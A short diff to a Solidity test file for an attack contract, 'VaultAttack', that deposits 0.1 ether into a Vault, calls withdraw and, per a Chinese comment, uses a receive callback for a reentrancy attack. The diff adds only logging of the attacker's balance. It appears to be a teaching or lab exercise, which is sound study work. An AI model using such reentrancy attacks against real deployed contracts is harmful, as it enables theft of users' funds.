@@ -2,6 +2,7 @@
 pragma solidity ^0.8.13;
 
 import "../src/Vault.sol";
+import "forge-std/console.sol";
 
 // 攻击合约
 contract VaultAttack {
@@ -17,6 +18,8 @@ contract VaultAttack {
         vault.deposite{value: 0.1 ether}();
         // 开始提款
         vault.withdraw();
+        // 输出攻击合约余额
+        console.log("Attacker balance (ether):", address(this).balance / 1 ether);
     }
     
     // 接收ETH的回调函数，实现重入攻击
